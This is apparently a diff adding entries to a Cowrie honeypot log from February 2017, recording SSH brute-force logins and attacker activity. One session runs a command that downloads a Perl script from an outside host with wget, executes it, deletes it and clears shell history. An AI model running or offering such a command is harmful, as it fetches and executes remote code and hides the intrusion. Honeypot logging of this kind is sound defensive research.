@@ -7202,3 +7202,66 @@
 2017-02-22T02:33:11+0000 [CowrieTelnetTransport,13281,202.142.148.234] Command found: cat /dev/shm/.s
 2017-02-22T02:33:12+0000 [CowrieTelnetTransport,13281,202.142.148.234] CMD: /bin/busybox RVZTZ
 2017-02-22T02:33:12+0000 [CowrieTelnetTransport,13281,202.142.148.234] Command found: /bin/busybox RVZTZ
+2017-02-22T02:34:32+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 37.97.173.179:50106 (10.8.41.81:2222) [session: 7b77eec6]
+2017-02-22T02:34:32+0000 [HoneyPotSSHTransport,19264,37.97.173.179] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-02-22T02:34:32+0000 [HoneyPotSSHTransport,19264,37.97.173.179] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-02-22T02:34:32+0000 [HoneyPotSSHTransport,19264,37.97.173.179] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-22T02:34:32+0000 [HoneyPotSSHTransport,19264,37.97.173.179] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-22T02:34:32+0000 [HoneyPotSSHTransport,19264,37.97.173.179] NEW KEYS
+2017-02-22T02:34:32+0000 [HoneyPotSSHTransport,19264,37.97.173.179] starting service 'ssh-userauth'
+2017-02-22T02:34:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19264,37.97.173.179] 'smishcraft' trying auth 'password'
+2017-02-22T02:34:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19264,37.97.173.179] first time for 37.97.173.179, need: 1
+2017-02-22T02:34:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19264,37.97.173.179] login attempt: 1
+2017-02-22T02:34:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19264,37.97.173.179] login attempt [smishcraft/smishcraft] succeeded
+2017-02-22T02:34:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19264,37.97.173.179] 'smishcraft' authenticated with 'password'
+2017-02-22T02:34:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19264,37.97.173.179] starting service 'ssh-connection'
+2017-02-22T02:34:34+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] got channel 'session' request
+2017-02-22T02:34:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] channel open
+2017-02-22T02:34:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] executing command "uname -a;cd /tmp;wget http://fastprint.co/cs;perl cs;rm -rf cs;history -c"
+2017-02-22T02:34:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] Opening TTY Log: log/tty/20170222-023434-7b77eec6-0e.log
+2017-02-22T02:34:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] CMD: uname -a;cd /tmp;wget http://fastprint.co/cs;perl cs;rm -rf cs;history -c
+2017-02-22T02:34:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] Command found: uname -a
+2017-02-22T02:34:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] Command found: cd /tmp
+2017-02-22T02:34:34+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] Command found: wget http://fastprint.co/cs
+2017-02-22T02:34:34+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://fastprint.co/cs>
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Not storing duplicate content e3afa3f9d1bb4736c1a342289a20000793dbe57827dc1f3d66fc476723810fd3
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Downloaded URL (http://fastprint.co/cs) with SHA-256 e3afa3f9d1bb4736c1a342289a20000793dbe57827dc1f3d66fc476723810fd3 to dl/e3afa3f9d1bb4736c1a342289a20000793dbe57827dc1f3d66fc476723810fd3
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Command found: perl /tmp/cs
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/cs
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Command found: history -c
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] exitCode: 0
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] sending request 'exit-status'
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Not storing duplicate content e3afa3f9d1bb4736c1a342289a20000793dbe57827dc1f3d66fc476723810fd3
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Saved redir contents with SHA-256 e3afa3f9d1bb4736c1a342289a20000793dbe57827dc1f3d66fc476723810fd3 to dl/e3afa3f9d1bb4736c1a342289a20000793dbe57827dc1f3d66fc476723810fd3
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] Closing TTY Log: log/tty/20170222-023434-7b77eec6-0e.log after 0 seconds
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-22T02:34:35+0000 [HTTPPageDownloader,client] sending close 0
+2017-02-22T02:34:35+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://fastprint.co/cs>
+2017-02-22T02:34:35+0000 [HoneyPotSSHTransport,19264,37.97.173.179] Got remote error, code 11
+	reason: Normal Shutdown, Thank you for playing
+2017-02-22T02:34:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,19264,37.97.173.179] remote close
+2017-02-22T02:34:35+0000 [HoneyPotSSHTransport,19264,37.97.173.179] avatar smishcraft logging out
+2017-02-22T02:34:35+0000 [HoneyPotSSHTransport,19264,37.97.173.179] connection lost
+2017-02-22T02:34:35+0000 [HoneyPotSSHTransport,19264,37.97.173.179] Connection lost after 3 seconds
+2017-02-22T02:34:52+0000 [CowrieTelnetTransport,13281,202.142.148.234] Closing TTY Log: log/tty/20170222-023310-None-13281i.log after 101 seconds
+2017-02-22T02:34:52+0000 [CowrieTelnetTransport,13281,202.142.148.234] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-02-22T02:34:52+0000 [CowrieTelnetTransport,13281,202.142.148.234] Connection lost after 104 seconds
+2017-02-22T02:34:54+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 37.97.173.179:57592 (10.8.41.81:2222) [session: 32e5e12c]
+2017-02-22T02:34:54+0000 [HoneyPotSSHTransport,19265,37.97.173.179] Remote SSH version: SSH-2.0-libssh2_1.4.3
+2017-02-22T02:34:54+0000 [HoneyPotSSHTransport,19265,37.97.173.179] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-02-22T02:34:54+0000 [HoneyPotSSHTransport,19265,37.97.173.179] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-22T02:34:54+0000 [HoneyPotSSHTransport,19265,37.97.173.179] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-02-22T02:34:55+0000 [HoneyPotSSHTransport,19265,37.97.173.179] NEW KEYS
+2017-02-22T02:34:55+0000 [HoneyPotSSHTransport,19265,37.97.173.179] starting service 'ssh-userauth'
+2017-02-22T02:34:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19265,37.97.173.179] 'ryan' trying auth 'password'
+2017-02-22T02:34:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19265,37.97.173.179] login attempt: 2
+2017-02-22T02:34:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19265,37.97.173.179] login return, expect: [smishcraft/smishcraft]
+2017-02-22T02:34:55+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,19265,37.97.173.179] login attempt [ryan/ryan] failed
+2017-02-22T02:34:56+0000 [-] 'ryan' failed auth 'password'
+2017-02-22T02:34:56+0000 [-] unauthorized login: 
+2017-02-22T02:34:56+0000 [HoneyPotSSHTransport,19265,37.97.173.179] Got remote error, code 11
+	reason: Normal Shutdown, Thank you for playing
+2017-02-22T02:34:56+0000 [HoneyPotSSHTransport,19265,37.97.173.179] connection lost
+2017-02-22T02:34:56+0000 [HoneyPotSSHTransport,19265,37.97.173.179] Connection lost after 1 seconds
